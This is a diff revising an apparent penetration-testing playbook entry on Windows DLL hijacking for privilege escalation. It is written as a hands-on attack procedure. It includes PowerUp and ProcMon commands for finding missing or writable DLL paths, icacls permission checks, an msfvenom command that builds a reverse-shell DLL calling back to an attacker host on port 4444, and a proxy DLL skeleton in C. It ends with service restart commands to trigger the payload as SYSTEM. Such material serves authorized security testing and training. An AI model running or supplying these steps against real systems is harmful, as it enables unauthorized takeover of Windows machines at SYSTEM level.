@@ -3,17 +3,31 @@ id: windows-dll-hijack
 title: DLL Hijacking
 stage: privesc
 tags: [windows]
-tools:
-  - procmon.exe (filter: PATH NOT FOUND + .dll)
-  - msfvenom -p windows/x64/shell_reverse_tcp -f dll -o evil.dll
-  - icacls "C:\path\to\dir"
-leads_to: [system-shell, rev-shell]
-summary: Place a malicious DLL in a directory searched before the legitimate one to execute code in the context of a privileged process.
+summary: Plant a malicious DLL in a directory searched before the legitimate one — exploitable when a privileged process loads a DLL from a user-writable path or when a DLL is missing entirely.
+leads_to:
+  - system-shell
+  - rev-shell
 ---
 
-## Find Hijackable DLLs with ProcMon
+## Prerequisites
 
-Run on the target (or transfer Sysinternals ProcMon):
+A low-privilege Windows shell. A privileged process (running as SYSTEM or Admin) that loads a DLL from a user-writable directory, or that searches for a DLL that doesn't exist. ProcMon (Sysinternals) to identify missing DLL loads. PowerUp for automated discovery.
+
+DLL hijacking exploits Windows's DLL search order — the application directory is checked first, before System32. If a SYSTEM-level service binary lives in a directory you can write to, or if it calls a DLL by name that doesn't exist, you can drop your own DLL there and it runs under the process's identity. Phantom DLLs (missing ones) are the easiest — no need to forward exports.
+
+## Quick Win
+
+> Run PowerUp for automated detection — Find-DLLHijack catches the most common cases.
+
+```powershell
+. .\PowerUp.ps1
+Find-DLLHijack
+Find-PathDLLHijack
+```
+
+## Find with ProcMon (Most Thorough)
+
+> Filter for NAME NOT FOUND + .dll to see exactly which DLLs are missing in writable locations.
 
 ```
 Filter: Process Name → target process
@@ -21,22 +35,16 @@ Filter: Result → NAME NOT FOUND
 Filter: Path → ends with .dll
 ```
 
-Look for DLL loads that fail in a user-writable directory (e.g., `C:\Program Files\App\missing.dll`).
+Look for DLL loads that fail in a user-writable directory.
 
-## Identify Writable Directories in Search Order
+## Check Directory Write Permissions
 
-Windows DLL search order (SafeDLLSearchMode ON):
-1. Application directory
-2. `C:\Windows\System32`
-3. `C:\Windows\System`
-4. `C:\Windows`
-5. CWD
-6. `%PATH%` directories
+> If the app directory or a PATH entry is writable, that's the hijack location.
 
 ```powershell
-# Check if the app directory is writable
+# Check app directory
 icacls "C:\Program Files\VulnerableApp\"
-# Look for: BUILTIN\Users:(W) or your user:(W)
+# BUILTIN\Users:(W) = writable
 
 # Check PATH entries for writable directories
 $env:PATH -split ';' | ForEach-Object { icacls $_ 2>$null | Select-String "(W)" }
@@ -44,18 +52,17 @@ $env:PATH -split ';' | ForEach-Object { icacls $_ 2>$null | Select-String "(W)" 
 
 ## Build the Malicious DLL
 
+> msfvenom for a reverse shell, or a minimal C DLL for a targeted payload.
+
 ```bash
 # Reverse shell DLL
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER LPORT=4444 -f dll -o evil.dll
-
-# Or with meterpreter
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ATTACKER LPORT=4444 -f dll -o evil.dll
 ```
 
-For a DLL that must export specific functions (required by some apps), use a proxy DLL:
+For apps that require the DLL to export specific functions (proxy DLL):
 
 ```c
-// Minimal proxy dll (compile with: x86_64-w64-mingw32-gcc -shared -o target.dll proxy.c)
+// Compile: x86_64-w64-mingw32-gcc -shared -o target.dll proxy.c
 #include <windows.h>
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
     if (fdwReason == DLL_PROCESS_ATTACH) {
@@ -65,35 +72,23 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
 }
 ```
 
-## Automated Discovery — PowerUp
-
-```powershell
-. .\PowerUp.ps1
-Invoke-AllChecks
-
-# Specifically for DLL hijacking:
-Find-DLLHijack
-Find-PathDLLHijack
-```
-
 ## Service DLL Hijacking
 
-If a service runs as SYSTEM and loads a missing DLL from a writable path:
+> Service running as SYSTEM loading a missing DLL from a writable path — place DLL, restart service.
 
 ```powershell
 # Find services and their binary paths
 Get-WmiObject win32_service | Select-Object Name, PathName, StartMode, State
 
-# Check the binary's directory for writability
+# Check if the binary's directory is writable
 icacls (Split-Path -Parent "C:\Service\service.exe")
 ```
 
-Place DLL → restart service (if you have rights) or wait for reboot.
+```bash
+# Place DLL → restart service (if you have restart rights) or wait for reboot
+sc stop ServiceName && sc start ServiceName
+```
 
-## Notes
+## Leads To
 
-- DLL hijacking is particularly powerful when the target process runs as SYSTEM or Administrator
-- Some apps explicitly load DLLs via `LoadLibrary` — check with strings or IDA for hardcoded paths
-- Phantom DLLs (DLLs the app tries to load but that don't exist) are the easiest — no need to forward exports
-- Always check the app directory first — it's searched before System32 and is often writable
-
+DLL loaded by SYSTEM process → reverse shell or SUID-equivalent payload as SYSTEM → system-shell. Place DLL in app directory → runs on next service restart or reboot. Phantom DLL is cleanest — no export forwarding needed, lower chance of app crash.
